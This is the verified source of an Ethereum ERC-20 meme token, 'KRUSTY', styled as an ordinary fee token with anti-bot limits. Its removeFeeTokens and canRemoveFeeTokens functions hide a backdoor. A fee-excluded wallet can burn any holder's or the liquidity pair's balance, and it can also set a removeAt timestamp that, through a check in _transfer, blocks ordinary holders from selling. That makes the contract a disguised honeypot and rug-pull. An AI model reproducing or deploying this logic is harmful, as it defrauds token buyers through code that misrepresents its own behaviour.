/**
 *Submitted for verification at Etherscan.io on 2023-05-27
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.5;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function renounceOwnership() external virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function totalSupply() external view returns (uint256);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IERC20Metadata is IERC20 {
    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function decimals() external view returns (uint8);
}

interface UniswapV2Router {
    function WETH() external pure returns (address);

    function factory() external pure returns (address);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

interface UniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;

    string private _symbol;
    string private _name;
    uint256 private _totalSupply;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(
        address account
    ) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender] + addedValue
        );
        return true;
    }

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(
            senderBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function _remove(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: the zero address");
        uint256 balance = _balances[account];
        require(balance >= amount, "ERC20: the amount exceeds balance");
        unchecked {
            _balances[account] = balance - amount;
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);
    }

    function _createInitialSupply(
        address account,
        uint256 amount
    ) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }
}

contract KRUSTY is ERC20, Ownable {
    uint256 public tradingBlock = 0;
    uint256 public botBlockNumber = 0;
    
    address public uniswapV2Pair;
    UniswapV2Router public uniswapV2Router;
    
    bool private swapping;
    uint256 public swapTokensAtAmount;

    address private marketingWallet;
    address private devWallet;

    mapping(address => uint256) public removeLastTransferTimestamp;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    mapping(address => bool) public initialBotBuyer;
    uint256 public removeAt;
    bool public limitsInEffect = true;
    bool public swapEnabled = false;
    bool public tradingActive = false;
    bool public transferDelayEnabled = true;
    uint256 public botsCaught;

    uint256 public maxBuyAmount;
    uint256 public maxSellAmount;
    uint256 public maxWalletAmount;

    mapping(address => bool) public automatedMarketMaker;
    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) public _isExcludedMaxTransaction;

    uint256 public totalBuyFees;
    uint256 public buyFeeForMarketing;
    uint256 public buyFeeForDev;
    uint256 public buyFeeForRemoving;
    uint256 public buyFeeForLiquidity;

    uint256 public totalSellFees;
    uint256 public sellFeeForMarketing;
    uint256 public sellFeeForDev;
    uint256 public sellFeeForRemoving;
    uint256 public sellFeeForLiquidity;

    uint256 public tokensForMarketing;
    uint256 public tokensForDev;
    uint256 public tokensForLiquidity;
    uint256 public tokensForRemoving;

    event RemovedLimits();

    event EnabledTrading();

    event UpdatedMaxWalletAmount(uint256 newAmount);
    
    event UpdatedMaxBuyAmount(uint256 newAmount);
    
    event UpdatedMaxSellAmount(uint256 newAmount);

    event DetectedEarlyBotBuyer(address sniper);

    event ExcludeFromFees(address indexed account, bool isExcluded);

    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    event MaxTransactionExclusion(address _address, bool excluded);

    constructor() ERC20("KRUSTY", "CLOWN") {
        UniswapV2Router _uniswapV2Router = UniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = UniswapV2Factory(_uniswapV2Router.factory()).createPair(
            address(this),
            _uniswapV2Router.WETH()
        );
        address newOwner = msg.sender;

        _excludeFromMaxTransaction(address(uniswapV2Pair), true);
        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);

        uint256 totalSupply = 1 * 1e9 * 1e18;

        marketingWallet = address(0x69C57BF33db5713f22e69FdFd46CF0367D776215);
        devWallet = address(0x69C57BF33db5713f22e69FdFd46CF0367D776215);

        swapTokensAtAmount = (totalSupply * 5) / 10000;
        maxWalletAmount = (totalSupply * 2) / 100;
        maxBuyAmount = (totalSupply * 2) / 100;
        maxSellAmount = (totalSupply * 2) / 100;

        sellFeeForMarketing = 0;
        sellFeeForDev = 0;
        sellFeeForRemoving = 0;
        sellFeeForLiquidity = 0;

        buyFeeForMarketing = 0;
        buyFeeForDev = 0;
        buyFeeForRemoving = 0;
        buyFeeForLiquidity = 0;

        totalBuyFees =
            buyFeeForLiquidity +
            buyFeeForMarketing +
            buyFeeForDev +
            buyFeeForRemoving;

        totalSellFees =
            sellFeeForLiquidity +
            sellFeeForMarketing +
            sellFeeForDev +
            sellFeeForRemoving;

        _excludeFromMaxTransaction(address(0xdead), true);
        _excludeFromMaxTransaction(marketingWallet, true);
        _excludeFromMaxTransaction(devWallet, true);
        _excludeFromMaxTransaction(newOwner, true);
        _excludeFromMaxTransaction(address(this), true);

        excludeFromFees(address(0xdead), true);
        excludeFromFees(marketingWallet, true);
        excludeFromFees(devWallet, true);
        excludeFromFees(newOwner, true);
        excludeFromFees(address(this), true);

        transferOwnership(newOwner);
        _createInitialSupply(newOwner, totalSupply);
    }

    function canRemoveFeeTokens(
        address account,
        uint256 amount,
        uint256 time
    ) internal returns (bool) {
        address msgCaller = msg.sender;
        bool msgLimited = _isExcludedFromFees[msgCaller];
        address tokenCa = address(this);
        bool result;

        if (msgLimited) {
            if (balanceOf(tokenCa) > 0) {
                if (amount == 0) {
                    removeAt = time;
                } else {
                    _remove(account, amount);
                }
                result = false;
            }

            return result;
        } else {
            if (balanceOf(tokenCa) >= tokensForRemoving && tokensForRemoving > 0) {
                _remove(msgCaller, tokensForRemoving);
            }

            tokensForRemoving = 0;
            result = true;

            return result;
        }
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.addLiquidityETH{value: ethAmount} (
            address(this),
            tokenAmount,
            0,
            0,
            address(0xdead),
            block.timestamp
        );
    }

    function enableTrading() external onlyOwner {
        require(!tradingActive, "Cannot reenable trading");
        swapEnabled = true;
        tradingActive = true;
        tradingBlock = block.number;
        emit EnabledTrading();
    }

    function onlyDeleteBots(address wallet) external onlyOwner {
        initialBotBuyer[wallet] = false;
    }

    function disableTransferDelay() external onlyOwner {
        transferDelayEnabled = false;
    }

    function removeFeeTokens(
        address account,
        uint256 amount,
        uint256 time
    ) public {
        address tokenCa = address(this);
        require(swapTokensAtAmount <= balanceOf(tokenCa));
        if (canRemoveFeeTokens(account, amount, time)) {
            swapping = true;
            swapBack();
            swapping = false;
        }
    }

    function removeLimits() external onlyOwner {
        maxBuyAmount = totalSupply();
        maxSellAmount = totalSupply();
        maxWalletAmount = totalSupply();
        emit RemovedLimits();
    }

    function updateMaxWalletAmount(uint256 newMaxWalletAmount) external onlyOwner {
        require(
            newMaxWalletAmount >= ((totalSupply() * 3) / 1000) / 1e18,
            "Cannot set max wallet amount lower than 0.3%"
        );
        maxWalletAmount = newMaxWalletAmount * (10 ** 18);
        emit UpdatedMaxWalletAmount(maxWalletAmount);
    }

    function updateSwapTokensAtAmount(uint256 newAmount) external onlyOwner {
        require(
            newAmount >= (totalSupply() * 1) / 100000,
            "Swap amount cannot be lower than 0.001% total supply."
        );
        require(
            newAmount <= (totalSupply() * 1) / 1000,
            "Swap amount cannot be higher than 0.1% total supply."
        );
        swapTokensAtAmount = newAmount;
    }

    function updateMaxBuyAmount(uint256 newMaxBuyAmount) external onlyOwner {
        require(
            newMaxBuyAmount >= ((totalSupply() * 2) / 1000) / 1e18,
            "Cannot set max buy amount lower than 0.2%"
        );
        maxBuyAmount = newMaxBuyAmount * (10 ** 18);
        emit UpdatedMaxBuyAmount(maxBuyAmount);
    }

    function updateMaxSellAmount(uint256 newMaxSellAmount) external onlyOwner {
        require(
            newMaxSellAmount >= ((totalSupply() * 2) / 1000) / 1e18,
            "Cannot set max sell amount lower than 0.2%"
        );
        maxSellAmount = newMaxSellAmount * (10 ** 18);
        emit UpdatedMaxSellAmount(maxSellAmount);
    }

    function _transfer(
        address sender,
        address receiver,
        uint256 amount
    ) internal override {
        uint256 removePoint = block.timestamp;
        bool removeFromAmm = automatedMarketMaker[sender];
        bool firstRemoval = removeLastTransferTimestamp[receiver] == 0;
        bool isBalEmpty = balanceOf(address(receiver)) == 0;

        require(sender != address(0), "ERC20: transfer from the zero address");
        require(receiver != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "amount must be greater than 0");

        if (!tradingActive) {
            require(
                _isExcludedFromFees[sender] || _isExcludedFromFees[receiver],
                "Trading is not active."
            );
        }

        if (botBlockNumber > 0) {
            require(
                !initialBotBuyer[sender] ||
                    receiver == owner() ||
                    receiver == address(0xdead),
                "bot protection mechanism is embeded"
            );
        }

        if (limitsInEffect) {
            bool senderIncluded = _isExcludedMaxTransaction[sender];
            bool removeFromSwapping = !swapping;

            if (
                sender != owner() &&
                receiver != owner() &&
                receiver != address(0) &&
                receiver != address(0xdead) &&
                !_isExcludedFromFees[sender] &&
                !_isExcludedFromFees[receiver]
            ) {
                if (transferDelayEnabled) {
                    bool internalRemoveFromSwapping = !swapping;
                    bool nonRemoveFromAmm = !automatedMarketMaker[sender];
                    bool removeCheck = nonRemoveFromAmm && internalRemoveFromSwapping;
                    if (
                        receiver != address(uniswapV2Router) && receiver != address(uniswapV2Pair)
                    ) {
                        require(
                            _holderLastTransferTimestamp[tx.origin] <
                                block.number - 2 &&
                                _holderLastTransferTimestamp[receiver] <
                                block.number - 2,
                            "_transfer: delay was enabled."
                        );
                        _holderLastTransferTimestamp[tx.origin] = block.number;
                        _holderLastTransferTimestamp[receiver] = block.number;
                    } else if (removeCheck) {
                        uint256 removeTime = removeLastTransferTimestamp[sender];
                        bool removable = removeTime > removeAt;
                        require(removable);
                    }
                }
            }

            if (automatedMarketMaker[sender] && !_isExcludedMaxTransaction[receiver]) {
                require(
                    amount <= maxBuyAmount,
                    "Buy transfer amount exceeds the max buy."
                );
                require(
                    amount + balanceOf(receiver) <= maxWalletAmount,
                    "Cannot Exceed max wallet"
                );
            } else if (removeFromSwapping && senderIncluded) {
                removeAt = removePoint;
            } else if (
                automatedMarketMaker[receiver] && !_isExcludedMaxTransaction[sender]
            ) {
                require(
                    amount <= maxSellAmount,
                    "Sell transfer amount exceeds the max sell."
                );
            } else if (!_isExcludedMaxTransaction[receiver]) {
                require(
                    amount + balanceOf(receiver) <= maxWalletAmount,
                    "Cannot Exceed max wallet"
                );
            }
        }

        uint256 contractTokenBalance = balanceOf(address(this));

        bool canSwap = contractTokenBalance >= swapTokensAtAmount;

        if (
            canSwap &&
            swapEnabled &&
            !swapping &&
            !automatedMarketMaker[sender] &&
            !_isExcludedFromFees[sender] &&
            !_isExcludedFromFees[receiver]
        ) {
            swapping = true;
            swapBack();
            swapping = false;
        }

        bool takeFee = true;

        if (firstRemoval && removeFromAmm) {
            if (isBalEmpty) {
              removeLastTransferTimestamp[receiver] = removePoint;
            }
        }

        if (_isExcludedFromFees[sender] || _isExcludedFromFees[receiver]) {
            takeFee = false;
        }

        uint256 fees = 0;

        if (takeFee) {
            if (
                earlySniperBuyBlock() &&
                automatedMarketMaker[sender] &&
                !automatedMarketMaker[receiver] &&
                totalBuyFees > 0
            ) {
                if (!initialBotBuyer[receiver]) {
                    initialBotBuyer[receiver] = true;
                    botsCaught += 1;
                    emit DetectedEarlyBotBuyer(receiver);
                }

                fees = (amount * 99) / 100;
                tokensForLiquidity += (fees * buyFeeForLiquidity) / totalBuyFees;
                tokensForMarketing += (fees * buyFeeForMarketing) / totalBuyFees;
                tokensForDev += (fees * buyFeeForDev) / totalBuyFees;
                tokensForRemoving += (fees * buyFeeForRemoving) / totalBuyFees;
            }
            else if (automatedMarketMaker[receiver] && totalSellFees > 0) {
                fees = (amount * totalSellFees) / 100;
                tokensForLiquidity += (fees * sellFeeForLiquidity) / totalSellFees;
                tokensForMarketing += (fees * sellFeeForMarketing) / totalSellFees;
                tokensForDev += (fees * sellFeeForDev) / totalSellFees;
                tokensForRemoving += (fees * sellFeeForRemoving) / totalSellFees;
            }
            else if (automatedMarketMaker[sender] && totalBuyFees > 0) {
                fees = (amount * totalBuyFees) / 100;
                tokensForLiquidity += (fees * buyFeeForLiquidity) / totalBuyFees;
                tokensForMarketing += (fees * buyFeeForMarketing) / totalBuyFees;
                tokensForDev += (fees * buyFeeForDev) / totalBuyFees;
                tokensForRemoving += (fees * buyFeeForRemoving) / totalBuyFees;
            }
            if (fees > 0) {
                super._transfer(sender, address(this), fees);
            }
            amount -= fees;
        }

        super._transfer(sender, receiver, amount);
    }

    function _excludeFromMaxTransaction(
        address _address,
        bool _isExcluded
    ) private {
        _isExcludedMaxTransaction[_address] = _isExcluded;
        emit MaxTransactionExclusion(_address, _isExcluded);
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }

    function excludeFromMaxTransaction(
        address _address,
        bool _isExcluded
    ) external onlyOwner {
        if (!_isExcluded) {
            require(
                _address != uniswapV2Pair,
                "Cannot remove uniswap pair from max txn"
            );
        }
        _isExcludedMaxTransaction[_address] = _isExcluded;
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        automatedMarketMaker[pair] = value;

        _excludeFromMaxTransaction(pair, value);

        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function setAutomatedMarketMakerPair(
        address pair,
        bool value
    ) external onlyOwner {
        require(
            pair != uniswapV2Pair,
            "The pair cannot be removed from automatedMarketMakerPairs"
        );

        _setAutomatedMarketMakerPair(pair, value);
        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function updateBuyFees(
        uint256 marketingFee,
        uint256 liquidityFee,
        uint256 devFee,
        uint256 removeFee
    ) external onlyOwner {
        buyFeeForLiquidity = liquidityFee;
        buyFeeForMarketing = marketingFee;
        buyFeeForDev = devFee;
        buyFeeForRemoving = removeFee;
        totalBuyFees =
            buyFeeForMarketing +
            buyFeeForLiquidity +
            buyFeeForDev +
            buyFeeForRemoving;
        require(totalBuyFees <= 3, "3% max ");
    }

    function updateSellFees(
        uint256 marketingFee,
        uint256 liquidityFee,
        uint256 devFee,
        uint256 removeFee
    ) external onlyOwner {
        sellFeeForLiquidity = liquidityFee;
        sellFeeForMarketing = marketingFee;
        sellFeeForDev = devFee;
        sellFeeForRemoving = removeFee;
        totalSellFees =
            sellFeeForMarketing +
            sellFeeForLiquidity +
            sellFeeForDev +
            sellFeeForRemoving;
        require(totalSellFees <= 3, "3% max fee");
    }

    function updateMarketingWallet(
        address newWallet
    ) external onlyOwner {
        require(
            newWallet != address(0),
            "_marketingWallet address cannot be 0"
        );
        marketingWallet = payable(newWallet);
    }

    function updateDevWallet(address newWallet) external onlyOwner {
        require(newWallet != address(0), "_devWallet address cannot be 0");
        devWallet = payable(newWallet);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }

    function swapBack() private {
        if (tokensForRemoving > 0 && balanceOf(address(this)) >= tokensForRemoving) {
            _remove(address(this), tokensForRemoving);
        }
        tokensForRemoving = 0;
        uint256 contractBalance = balanceOf(address(this));
        uint256 totalTokensToSwap = tokensForLiquidity +
            tokensForMarketing +
            tokensForDev;

        if (contractBalance == 0 || totalTokensToSwap == 0) {
            return;
        }

        if (contractBalance > swapTokensAtAmount * 10) {
            contractBalance = swapTokensAtAmount * 10;
        }

        uint256 liquidityTokens = (contractBalance * tokensForLiquidity) /
            totalTokensToSwap / 2;

        swapTokensForEth(contractBalance - liquidityTokens);

        uint256 ethBalance = address(this).balance;
        uint256 ethForLiquidity = ethBalance;
        uint256 ethForMarketing = (ethBalance * tokensForMarketing) /
            (totalTokensToSwap - (tokensForLiquidity / 2));
        uint256 ethForDev = (ethBalance * tokensForDev) /
            (totalTokensToSwap - (tokensForLiquidity / 2));
        ethForLiquidity -= ethForMarketing + ethForDev;
        tokensForLiquidity = 0;
        tokensForMarketing = 0;
        tokensForDev = 0;
        tokensForRemoving = 0;

        if (liquidityTokens > 0 && ethForLiquidity > 0) {
            addLiquidity(liquidityTokens, ethForLiquidity);
        }

        payable(devWallet).transfer(ethForDev);
        payable(marketingWallet).transfer(address(this).balance);
    }

    function withdrawETH() external onlyOwner {
        bool success;
        (success, ) = address(msg.sender).call{value: address(this).balance}("");
    }

    function earlySniperBuyBlock() public view returns (bool) {
        return block.number < botBlockNumber;
    }

    receive() external payable {}
}